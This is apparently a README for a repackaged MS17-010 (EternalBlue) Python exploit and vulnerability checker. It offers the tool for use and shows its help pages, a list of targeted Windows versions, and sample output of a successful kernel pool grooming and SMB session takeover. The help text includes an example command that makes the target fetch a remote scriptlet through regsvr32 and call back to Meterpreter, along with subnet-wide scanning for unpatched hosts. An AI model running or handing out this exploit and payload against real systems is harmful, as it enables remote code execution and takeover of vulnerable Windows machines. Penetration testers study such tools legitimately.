# MS17-010: Python
All credit goes to Worawit: 

[Worawit Wang: GitHub](https://github.com/worawit/MS17-010/)

[Worawit Wang: Twitter](https://twitter.com/sleepya_/)

Worawit Wang released a collection of Python exploits for MS17-010. These tools worked far more reliably than the Metasploit modules but didn't have much of a payload besides writing a pwned.txt to the C:/. However, Worawit Wang did add functionality for creating a service. 

Korey McKinley wrote an [article](https://lmgsecurity.com/manually-exploiting-ms17-010/) utilising that function to create a service which used regsvr32 to call back to Meterpreter and create a full Meterpreter connection. I'd never seen that path to exploitation, so I thought I'd modify zzz_exploit.py with Korey's logic and make the script more dynamic and user friendly. 

However, the module Korey used in that blog article was not available in my version of Metasploit. It is now called **web_delivery**. 

The zzz_exploit.py found in this repo is the same exploit logic. But it has been made more dynamic. It is now possible to pass user and password with the -u and -p, respectively. A command to write to a service is passed with the -c option and the target and pipe are -t and -p. 

Logger.py is just a script I've been reusing with all my code to prettify output. If deleted, zzz will break :)
ip_parser.py is just a script for parsing different IP/network formats. (192.168.0.0/24, 192.168.0.0-150, etc)

Here is the full help page output:
```
➜  MS17-010 git:(master) ✗ ./zzz_exploit.py --help                                                                                        
usage: zzz_exploit.py [-h] [-u] [-p] -t  [-c] [-P] [--version]

Tested versions:
1	Windows 2016 x64
2	Windows 10 Pro Vuild 10240 x64
3	Windows 2012 R2 x64
4	Windows 8.1 x64
5	Windows 2008 R2 SP1 x64
6	Windows 7 SP1 x64
7	Windows 2008 SP1 x64
8	Windows 2003 R2 SP2 x64
9	Windows XP SP2 x64
10	Windows 8.1 x86
11	Windows 7 SP1 x86
12	Windows 2008 SP1 x86
13	Windows 2003 SP2 x86
14	Windows XP SP3 x86
15	Windows 2000 SP4 x86

optional arguments:
  -h, --help        show this help message and exit
  -u , --user       Username to authenticate with
  -p , --password   Password for specified user
  -t , --target     Target for exploitation
  -c , --command    Command to add to service
  -P , --pipe       Pipe to connect to
  --version         show program's version number and exit
Example: python zzz_exploit -t 192.168.0.1-100 -c 'regsvr32 /s /n /u /i:http://192.168.0.1:9000/1EsrjpXH2pWdgd.sct scrobj.dll'
```

Sample output:
```
> # python zzz_exploit.py -t 10.10.11.53                                                                                                                                                     
[08:50:24]  [INFO]:     TARGET: 10.10.11.53
[08:50:24]  [ACTION]:   CONNECTING TO TARGET...
[08:50:24]  [ACTION]:   GETTING TARGET OS...
[08:50:24]  [INFO]:     TARGET OS: Windows Server 2012 R2 Datacenter 9600
[08:50:24]  [ACTION]:   GETTING PIPE...
[08:50:25]  [INFO]:     USING PIPE: spoolss
[08:50:25]  [INFO]:     TARGET ARCHITECTURE: 64 bit
[08:50:25]  [INFO]:     FRAG SIZE: 0x20
[08:50:25]  [INFO]:     GROOM_POOL_SIZE: 0x5030
[08:50:25]  [INFO]:     BRIDE_TRANS_SIZE: 0xf90
[08:50:25]  [ERROR]:    No transaction struct in leak data
[08:50:25]  [ERROR]:    LEAK FAILED! RETRYING...
[08:50:26]  [ERROR]:    No transaction struct in leak data
[08:50:26]  [ERROR]:    LEAK FAILED! RETRYING...
[08:50:26]  [ERROR]:    No transaction struct in leak data
[08:50:26]  [ERROR]:    LEAK FAILED! RETRYING...
[08:50:26]  [INFO]:     CONNECTION: 0xffffe001c6257910
[08:50:26]  [INFO]:     SESSION: 0xffffc000fab68150
[08:50:26]  [INFO]:     FLINK: 0xffffc000fafcd098
[08:50:26]  [INFO]:     InParam: 0xffffc000faf9116c
[08:50:26]  [INFO]:     MID: 0x3903
[08:50:26]  [ERROR]:    unexpected alignment, diff: 0x3b098
[08:50:26]  [ERROR]:    LEAK FAILED! RETRYING...
[08:50:27]  [INFO]:     CONNECTION: 0xffffe001c6257910
[08:50:27]  [INFO]:     SESSION: 0xffffc000fab68150
[08:50:27]  [INFO]:     FLINK: 0xffffc000fafd9098
[08:50:27]  [INFO]:     InParam: 0xffffc000fafd316c
[08:50:27]  [INFO]:     MID: 0x3a03
[08:50:27]  [SUCCESS]:  SUCCESS CONTROLLING GROOM TRANSACTION
[08:50:27]  [ACTION]:   MODIFYING TRANS1 STRUCT FOR READ/WRITE
[08:50:27]  [ACTION]:   CREATING SYSTEM SESSION TO SMB...
[08:50:28]  [ACTION]:   OVERWRITING SESSION SECURITY CONTEXT
[08:50:28]  [INFO]:     Writing command to service:
[08:50:28]  [ACTION]:   OPENING SVCManager ON 10.10.11.53...
[08:50:28]  [ACTION]:   CREATING SERVICE PKfJ...
[08:50:28]  [ACTION]:   STARTING SERVICE PKfJ...
[08:50:29]  [ERROR]:    SCMR SessionError: code: 0x41d - ERROR_SERVICE_REQUEST_TIMEOUT - The service did not respond to the start or control request in a timely fashion.                    
[08:50:29]  [ACTION]:   REMOVING SERVICE PKfJ...
[08:50:29]  [SUCCESS]:  FINISHED!
```
I wrote an article using Korey's payload and the new changes to the script, please see it [here](https://mez0.cc/posts/weaponised-worawit.html)


I made similar changes to checker.py, but the only additional logic I added was to be able to effectively run this script across a subnet. I imported the **netaddr** module and wrote a short for loop to run across the subnet.

Here is the help page for checker.py:

```
➜  MS17-010_WORAWIT git:(master) ✗ python checker.py --help         
usage: checker.py [-h] [-u] [-p] -t  [--version]

MS17-010 Checker script

optional arguments:
  -h, --help        show this help message and exit
  -u , --user       Username to authenticate with
  -p , --password   Password for specified user
  -t , --target     Target to check for MS17-010
  --version         show program's version number and exit

Example: python checker.py -t 192.168.0.1
```
Sample output:
```
> # python checker.py -t 10.10.11.53                                                                                                                                                         
[08:37:25]  [INFO]: 	CONNECTED TO 10.10.11.53
[08:37:25]  [INFO]: 	TARGET OS: Windows Server 2012 R2 Datacenter 9600
[08:37:25]  [SUCCESS]: 	10.10.11.53 IS NOT PATCHED!
[08:37:25]  [ACTION]: 	CHECKING NAMED PIPES...
[08:37:25]  [SUCCESS]: 	spoolss: OK (64 bit)
[08:37:26]  [SUCCESS]: 	samr: OK (64 bit)
[08:37:26]  [SUCCESS]: 	netlogon: OK (64 bit)
[08:37:26]  [SUCCESS]: 	lsarpc: OK (64 bit)
[08:37:26]  [ERROR]: 	browser: STATUS_OBJECT_NAME_NOT_FOUND

```

Any further ideas, changes or fixes; please let me know!
